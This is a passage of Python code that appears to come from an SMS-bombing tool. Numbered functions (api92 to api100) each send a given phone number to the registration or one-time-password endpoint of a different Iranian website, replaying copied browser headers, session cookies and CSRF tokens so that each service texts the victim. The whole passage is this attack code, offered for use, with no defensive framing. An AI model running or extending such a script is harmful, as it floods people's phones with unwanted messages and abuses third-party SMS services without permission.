        'analytics_campaign': '{%22source%22:%22yektanet%22%2C%22medium%22:%22native-retargeting%22%2C%22campaign%22:%22Yektanet_desktop%22%2C%22content%22:%22https://zoomit.ir%22%2C%22term%22:%22yn_item_534665%22%2C%22yn%22:%22v4-NTM0NjY1OjE2ODE1MzoyMDk0MDo5MDo2NTg0OjE6MQ%22%2C%22yn_data%22:%22vaaaaaaabuaaajfisbwlbrjgghalygnnabkaztczrtgnrgmmzngm3dambvfu2wmnzsgawtanrxgy2c2ndeg4zdazrsmq3tmmldmujdmmjxge3dmnbrgpyc4bc3lucfwxkwkn5fss2npjxw2u2vhfnfswkrm5iug33tjz3hamthmjawmykbkzxemu3km5kgw5rspbigoaaaaa6%22%2C%22yn_source%22:%22yektanet%22%2C%22general_yn_data%22:%22{%5C%22yektanet%5C%22:%5C%22vaaaaaaabuaaajfisbwlbrjgghalygnnabkaztczrtgnrgmmzngm3dambvfu2wmnzsgawtanrxgy2c2ndeg4zdazrsmq3tmmldmujdmmjxge3dmnbrgpyc4bc3lucfwxkwkn5fss2npjxw2u2vhfnfswkrm5iug33tjz3hamthmjawmykbkzxemu3km5kgw5rspbigoaaaaa6%5C%22%2C%5C%22ab%5C%22:%5C%22%5C%22}%22}',
        '_gid': 'GA1.2.883941618.1649699504',
        '_gat_UA-171257281-1': '1',
        'crisp-client%2Fsession%2F04987833-7004-4606-aa4b-15e5c3a04eb8': 'session_5d292b5d-70d7-40a5-a77a-2c58a3652f4f',
    }

    headers = {
        'authority': 'api.iranicard.ir',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_gcl_au=1.1.1586483943.1644073450; _ga=GA1.2.434054867.1644073452; __auc=de08ba5317eca6a1564340b1bf9; analytics_campaign={%22source%22:%22yektanet%22%2C%22medium%22:%22native-retargeting%22%2C%22campaign%22:%22Yektanet_desktop%22%2C%22content%22:%22https://zoomit.ir%22%2C%22term%22:%22yn_item_534665%22%2C%22yn%22:%22v4-NTM0NjY1OjE2ODE1MzoyMDk0MDo5MDo2NTg0OjE6MQ%22%2C%22yn_data%22:%22vaaaaaaabuaaajfisbwlbrjgghalygnnabkaztczrtgnrgmmzngm3dambvfu2wmnzsgawtanrxgy2c2ndeg4zdazrsmq3tmmldmujdmmjxge3dmnbrgpyc4bc3lucfwxkwkn5fss2npjxw2u2vhfnfswkrm5iug33tjz3hamthmjawmykbkzxemu3km5kgw5rspbigoaaaaa6%22%2C%22yn_source%22:%22yektanet%22%2C%22general_yn_data%22:%22{%5C%22yektanet%5C%22:%5C%22vaaaaaaabuaaajfisbwlbrjgghalygnnabkaztczrtgnrgmmzngm3dambvfu2wmnzsgawtanrxgy2c2ndeg4zdazrsmq3tmmldmujdmmjxge3dmnbrgpyc4bc3lucfwxkwkn5fss2npjxw2u2vhfnfswkrm5iug33tjz3hamthmjawmykbkzxemu3km5kgw5rspbigoaaaaa6%5C%22%2C%5C%22ab%5C%22:%5C%22%5C%22}%22}; _gid=GA1.2.883941618.1649699504; _gat_UA-171257281-1=1; crisp-client%2Fsession%2F04987833-7004-4606-aa4b-15e5c3a04eb8=session_5d292b5d-70d7-40a5-a77a-2c58a3652f4f',
        'origin': 'https://panel.iranicard.ir',
        'referer': 'https://panel.iranicard.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'mobile': number,
        'auth': 0,
    }

    response = requests.post('https://api.iranicard.ir/api/v1/register', headers=headers, cookies=cookies,
                             json=json_data)


def api92(number):
    cookies = {
        'ASP.NET_SessionId': '33jg5ixwvlpybfxx4w0mlalz',
        'LangName': 'fa-IR',
        '__RequestVerificationToken': 'NhJ_JqOiQEcuFLpSkNMbfv4Xy1VTv8DOvBtV54cSAdaAPceZbmnqJvWCCZelq7O8GeYTfo8s0z9PjmLs_quF1VutZxw1',
        '_ga': 'GA1.2.52338667.1649699608',
        '_gid': 'GA1.2.732538329.1649699608',
        '_gat_gtag_UA_114373954_1': '1',
        '_gcl_au': '1.1.197913777.1649699608',
        'crisp-client%2Fsession%2F1fef60c7-2131-4621-9e86-a381d29b3303': 'session_4bd0c28d-a1f9-4aa4-8235-4a1607dc0bdf',
    }

    headers = {
        'authority': 'hiholiday.ir',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'ASP.NET_SessionId=33jg5ixwvlpybfxx4w0mlalz; LangName=fa-IR; __RequestVerificationToken=NhJ_JqOiQEcuFLpSkNMbfv4Xy1VTv8DOvBtV54cSAdaAPceZbmnqJvWCCZelq7O8GeYTfo8s0z9PjmLs_quF1VutZxw1; _ga=GA1.2.52338667.1649699608; _gid=GA1.2.732538329.1649699608; _gat_gtag_UA_114373954_1=1; _gcl_au=1.1.197913777.1649699608; crisp-client%2Fsession%2F1fef60c7-2131-4621-9e86-a381d29b3303=session_4bd0c28d-a1f9-4aa4-8235-4a1607dc0bdf',
        'origin': 'https://hiholiday.ir',
        'referer': 'https://hiholiday.ir/flight',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobile': number,
        'X-Requested-With': 'XMLHttpRequest',
    }

    response = requests.post('https://hiholiday.ir/account/LoginByVerificaiton', headers=headers, cookies=cookies,
                             data=data)


def api93(number):
    headers = {
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'accept-language': 'fa',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://cinematicket.org/home/auth/register?returnUrl=%2F',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone_number': number[1:] + "98",
    }

    response = requests.post('https://cinematicket.org/api/v1/users/signup', headers=headers, json=json_data)


def api94(number):
    headers = {
        'authority': 'api.karnaval.ir',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://www.karnaval.ir',
        'referer': 'https://www.karnaval.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'queryId': '0edebe0df353cee7f11614a37087371f',
        'variables': {
            'phone': number,
            'isSecondAttempt': False,
        },
    }

    response = requests.post('https://api.karnaval.ir/graphql', headers=headers, json=json_data)


def api95(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '481d9af5-68b3-7859-c29b-2b68ca411091',
        'analytics_session_token': 'a9697b0b-d06a-ab28-3083-608db176dd31',
        'yektanet_session_last_activity': '4/11/2022',
        '_yngt_iframe': '1',
        '_ga_32LP7TRM6X': 'GS1.1.1649699859.1.0.1649699859.0',
        '_ga': 'GA1.1.525901429.1649699860',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_clck': '8vb82b|1|f0j|0',
        '_clsk': '10swzh4|1649699861664|1|1|e.clarity.ms/collect',
    }

    headers = {
        'authority': 'www.mrticket.ir',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=481d9af5-68b3-7859-c29b-2b68ca411091; analytics_session_token=a9697b0b-d06a-ab28-3083-608db176dd31; yektanet_session_last_activity=4/11/2022; _yngt_iframe=1; _ga_32LP7TRM6X=GS1.1.1649699859.1.0.1649699859.0; _ga=GA1.1.525901429.1649699860; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _clck=8vb82b|1|f0j|0; _clsk=10swzh4|1649699861664|1|1|e.clarity.ms/collect',
        'origin': 'https://www.mrticket.ir',
        'referer': 'https://www.mrticket.ir/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobile': number,
    }

    response = requests.post('https://www.mrticket.ir/fa/v2/signupbymobile/', headers=headers, cookies=cookies,
                             data=data)


def api96(number):
    headers = {
        'authority': 'auth.mrbilit.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'access-control-request-headers': 'authorization,x-playerid',
        'access-control-request-method': 'GET',
        'origin': 'https://mrbilit.com',
        'referer': 'https://mrbilit.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    params = {
        'mobileOrEmail': number,
        'source': '2',
        'sendTokenIfNot': 'true',
    }

    response = requests.options('https://auth.mrbilit.com/api/login/exists/v2', headers=headers, params=params)


def api97(number):
    cookies = {
        'PHPSESSID': 'n6k1n3d2d6agaop2443fdoap50',
        '_ga': 'GA1.2.524732274.1649700027',
        '_gid': 'GA1.2.470979534.1649700027',
        '_gat_gtag_UA_144017375_1': '1',
    }

    headers = {
        'authority': 'iranblit.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'PHPSESSID=n6k1n3d2d6agaop2443fdoap50; _ga=GA1.2.524732274.1649700027; _gid=GA1.2.470979534.1649700027; _gat_gtag_UA_144017375_1=1',
        'origin': 'https://iranblit.com',
        'referer': 'https://iranblit.com/user/account/requirecellphone/stay/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    data = {
        'cellphone': number,
    }

    response = requests.post('https://iranblit.com/user/account/requirecellphone/stay/', headers=headers,
                             cookies=cookies, data=data)


def api98(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '11378eae-7d51-1ab9-9f8f-9935bb77c299',
        'analytics_session_token': '0c615410-e520-e45d-1979-d8d2919965b0',
        'yektanet_session_last_activity': '4/11/2022',
        '_yngt_iframe': '1',
        '_ga': 'GA1.2.792019665.1649700125',
        '_gid': 'GA1.2.579082980.1649700125',
        '_gat_UA-47555075-1': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'XSRF-TOKEN': 'eyJpdiI6IkdrdTJuQVo4M0RNeUhqZGpGZXRocHc9PSIsInZhbHVlIjoiWFlrekJ1VnFtZ2QrZ1c1K2RwU0VQdTR0M1RmTFUzQ1IyZkhyUmpTQXFYOWV3aWVRdWJmcEpUcm5zV2VtR3VpQyIsIm1hYyI6IjcxMmFhYzdjNzk2ODNkZTE5YzM1NTQ1ZThkMmU0NTU5Y2YwMGI2MTQwZjMxZjNmNDY2NTI5OWFlZmE0YzFlODUifQ%3D%3D',
        'lastsecond_session': 'eyJpdiI6IjBFSzB1YTIrbUhQaUVFazFhQ0Q3VlE9PSIsInZhbHVlIjoiS1Z3TUNKS0dnUWRGM1hLYXUwZjF2NnpNNTRSa252MjBtRm9vYmtZUXJUV1wvQkY5ZDd4Z0NCUDI3cVlDdVBWZnhvS1NrXC9NbUtZQWQzNklBZW5jTEFDOThZaW9nRE93czhHMWR4bXFUVG42NVhIZGk2OHU5bG13dmR6QXdzTEZ2ZyIsIm1hYyI6IjQ3OGUzMDRlNDkxNTZjNmJjNTdkZjgyY2Q1MTJjZTk2OTJjMjU0MzViMjBjYzcwN2ViNzEzODU1ZGIxYjIxZmIifQ%3D%3D',
    }

    headers = {
        'authority': 'lastsecond.ir',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=11378eae-7d51-1ab9-9f8f-9935bb77c299; analytics_session_token=0c615410-e520-e45d-1979-d8d2919965b0; yektanet_session_last_activity=4/11/2022; _yngt_iframe=1; _ga=GA1.2.792019665.1649700125; _gid=GA1.2.579082980.1649700125; _gat_UA-47555075-1=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; XSRF-TOKEN=eyJpdiI6IkdrdTJuQVo4M0RNeUhqZGpGZXRocHc9PSIsInZhbHVlIjoiWFlrekJ1VnFtZ2QrZ1c1K2RwU0VQdTR0M1RmTFUzQ1IyZkhyUmpTQXFYOWV3aWVRdWJmcEpUcm5zV2VtR3VpQyIsIm1hYyI6IjcxMmFhYzdjNzk2ODNkZTE5YzM1NTQ1ZThkMmU0NTU5Y2YwMGI2MTQwZjMxZjNmNDY2NTI5OWFlZmE0YzFlODUifQ%3D%3D; lastsecond_session=eyJpdiI6IjBFSzB1YTIrbUhQaUVFazFhQ0Q3VlE9PSIsInZhbHVlIjoiS1Z3TUNKS0dnUWRGM1hLYXUwZjF2NnpNNTRSa252MjBtRm9vYmtZUXJUV1wvQkY5ZDd4Z0NCUDI3cVlDdVBWZnhvS1NrXC9NbUtZQWQzNklBZW5jTEFDOThZaW9nRE93czhHMWR4bXFUVG42NVhIZGk2OHU5bG13dmR6QXdzTEZ2ZyIsIm1hYyI6IjQ3OGUzMDRlNDkxNTZjNmJjNTdkZjgyY2Q1MTJjZTk2OTJjMjU0MzViMjBjYzcwN2ViNzEzODU1ZGIxYjIxZmIifQ%3D%3D',
        'origin': 'https://lastsecond.ir',
        'referer': 'https://lastsecond.ir/auth/register',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-csrf-token': 'WdoQSRAw71kg1yM7aPsP9NcjzX8hU3pmZMJa3Hdn',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6IkdrdTJuQVo4M0RNeUhqZGpGZXRocHc9PSIsInZhbHVlIjoiWFlrekJ1VnFtZ2QrZ1c1K2RwU0VQdTR0M1RmTFUzQ1IyZkhyUmpTQXFYOWV3aWVRdWJmcEpUcm5zV2VtR3VpQyIsIm1hYyI6IjcxMmFhYzdjNzk2ODNkZTE5YzM1NTQ1ZThkMmU0NTU5Y2YwMGI2MTQwZjMxZjNmNDY2NTI5OWFlZmE0YzFlODUifQ==',
    }

    json_data = {
        'username': number,
        'referral_code': None,
    }

    response = requests.post('https://lastsecond.ir/auth/register/token', headers=headers, cookies=cookies,
                             json=json_data)


def api99(number):
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IkNISEJyWlF0dEIrcVBlQStBVk5DeGc9PSIsInZhbHVlIjoibVNIMzBhV1J1Ymh3YmJNakRjTU1KYUx4dzFMUWJqblwvWEh4bm9XOWV0MmlXNVRodVc1WTZcL3RtU0dBTU9QaUgyMndKOUVwTHcyZHhXU3drZHRrbHB1dkVlQ25uQ1FHXC9TRUVcL2JWUUdNK0RybGZMREJicVcrNU10b2FOQmhIK09YIiwibWFjIjoiNzkyNmRmNWJjZWFlOTBkMGQ2NjNkNTQ0NjQ3ZTllMDQzMDc2N2E0MzFmYjZmN2QxMGYyYjgxYjVmMmI2MjhjYiJ9',
        'pool_session': 'eyJpdiI6IkVFZVJ6QWozcEN4K2l5aWhwYkZpbWc9PSIsInZhbHVlIjoibTVSV0tZMkxxbXVNNE5nMW5RM21OXC9Ld1FQSkdqS0E0MUF4NTFzUWVsam10K25ndE95WXpBVWpXVjVnQVl3bytTcjlkTmZwdk9cL2ZRSW5ISm5xdWNMRzQ5Qm1Ca1plVlFaNCtIYjBpS25sK3NEV2doMGw0aU1QU0NVQkhmT3dITyIsIm1hYyI6IjBjMTA5MGRlZDlkYTQ4ZjZlMmFjYWNmZmZlODI5ZWE0ZWU1OGQzYWM2YzgyMTliYzg5NDgwNjAyNmRiMDU0ZjgifQ%3D%3D',
        '_ga_SGD671MVXH': 'GS1.1.1649700175.1.0.1649700175.0',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '06e32838-e8d5-6d90-3d8e-50a76ca403a0',
        'analytics_session_token': '6e12249e-0636-4c87-10bd-bbbf47f7c8a6',
        'yektanet_session_last_activity': '4/11/2022',
        '_yngt_iframe': '1',
        '_ga': 'GA1.2.1410692300.1649700176',
        '_gid': 'GA1.2.343381064.1649700176',
        '_gat_UA-55218412-6': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        'SL_C_23361dd035530_VID': 'QGHzEBliEa',
        'SL_C_23361dd035530_KEY': '640234206157d6ee39ab0aad42f73506a9c469ce',
    }

    headers = {
        'authority': 'www.poolticket.org',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IkNISEJyWlF0dEIrcVBlQStBVk5DeGc9PSIsInZhbHVlIjoibVNIMzBhV1J1Ymh3YmJNakRjTU1KYUx4dzFMUWJqblwvWEh4bm9XOWV0MmlXNVRodVc1WTZcL3RtU0dBTU9QaUgyMndKOUVwTHcyZHhXU3drZHRrbHB1dkVlQ25uQ1FHXC9TRUVcL2JWUUdNK0RybGZMREJicVcrNU10b2FOQmhIK09YIiwibWFjIjoiNzkyNmRmNWJjZWFlOTBkMGQ2NjNkNTQ0NjQ3ZTllMDQzMDc2N2E0MzFmYjZmN2QxMGYyYjgxYjVmMmI2MjhjYiJ9; pool_session=eyJpdiI6IkVFZVJ6QWozcEN4K2l5aWhwYkZpbWc9PSIsInZhbHVlIjoibTVSV0tZMkxxbXVNNE5nMW5RM21OXC9Ld1FQSkdqS0E0MUF4NTFzUWVsam10K25ndE95WXpBVWpXVjVnQVl3bytTcjlkTmZwdk9cL2ZRSW5ISm5xdWNMRzQ5Qm1Ca1plVlFaNCtIYjBpS25sK3NEV2doMGw0aU1QU0NVQkhmT3dITyIsIm1hYyI6IjBjMTA5MGRlZDlkYTQ4ZjZlMmFjYWNmZmZlODI5ZWE0ZWU1OGQzYWM2YzgyMTliYzg5NDgwNjAyNmRiMDU0ZjgifQ%3D%3D; _ga_SGD671MVXH=GS1.1.1649700175.1.0.1649700175.0; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=06e32838-e8d5-6d90-3d8e-50a76ca403a0; analytics_session_token=6e12249e-0636-4c87-10bd-bbbf47f7c8a6; yektanet_session_last_activity=4/11/2022; _yngt_iframe=1; _ga=GA1.2.1410692300.1649700176; _gid=GA1.2.343381064.1649700176; _gat_UA-55218412-6=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; SL_C_23361dd035530_VID=QGHzEBliEa; SL_C_23361dd035530_KEY=640234206157d6ee39ab0aad42f73506a9c469ce',
        'origin': 'https://www.poolticket.org',
        'referer': 'https://www.poolticket.org/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
        'x-csrf-token': 'nbTyvoUY5ttqCnYYIk4geLqPBbvi3SJXP1uNkHhx',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobile': number,
        'approve_send_type': 'sms',
    }

    response = requests.post('https://www.poolticket.org/login/check-register', headers=headers, cookies=cookies,
                             data=data)


def api100(number):
    cookies = {
        '_gcl_au': '1.1.1222285665.1649700242',
        '_ga': 'GA1.2.711989353.1649700244',
        '_gid': 'GA1.2.1316601832.1649700244',
        '_gat_UA-58059678-23': '1',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '7fcfc7e9-4af2-ad91-e977-7371da4d29de',
        'analytics_session_token': 'c323f9af-0bfd-9a45-c541-ce39d8bd67b9',
        'yektanet_session_last_activity': '4/11/2022',
        '_yngt_iframe': '1',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '_617942188677a748fa5a4c22': 'true',
        '_hjSessionUser_1776097': 'eyJpZCI6ImMyYzI3ZjgwLTEyYTUtNTRkOC1iNjdiLWFkZGFiMDY3YWNjZCIsImNyZWF0ZWQiOjE2NDk3MDAyNDUyMTcsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjSession_1776097': 'eyJpZCI6IjQ3OGE1YTQxLTY5M2YtNGNjNC1iYjZhLTA1MTJmYzk4MDI0MSIsImNyZWF0ZWQiOjE2NDk3MDAyNDU1NTUsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
    }

    headers = {
        'authority': 'www.irantic.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer null',
        'content-type': 'application/json;charset=UTF-8',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_gcl_au=1.1.1222285665.1649700242; _ga=GA1.2.711989353.1649700244; _gid=GA1.2.1316601832.1649700244; _gat_UA-58059678-23=1; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=7fcfc7e9-4af2-ad91-e977-7371da4d29de; analytics_session_token=c323f9af-0bfd-9a45-c541-ce39d8bd67b9; yektanet_session_last_activity=4/11/2022; _yngt_iframe=1; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; _617942188677a748fa5a4c22=true; _hjSessionUser_1776097=eyJpZCI6ImMyYzI3ZjgwLTEyYTUtNTRkOC1iNjdiLWFkZGFiMDY3YWNjZCIsImNyZWF0ZWQiOjE2NDk3MDAyNDUyMTcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_1776097=eyJpZCI6IjQ3OGE1YTQxLTY5M2YtNGNjNC1iYjZhLTA1MTJmYzk4MDI0MSIsImNyZWF0ZWQiOjE2NDk3MDAyNDU1NTUsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0',
        'origin': 'https://www.irantic.com',
        'referer': 'https://www.irantic.com/cinema',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
    }

    json_data = {
        'mobile': number,
        'otp': 0,
    }

    response = requests.post('https://www.irantic.com//api/login/request', headers=headers, cookies=cookies,
                             json=json_data)
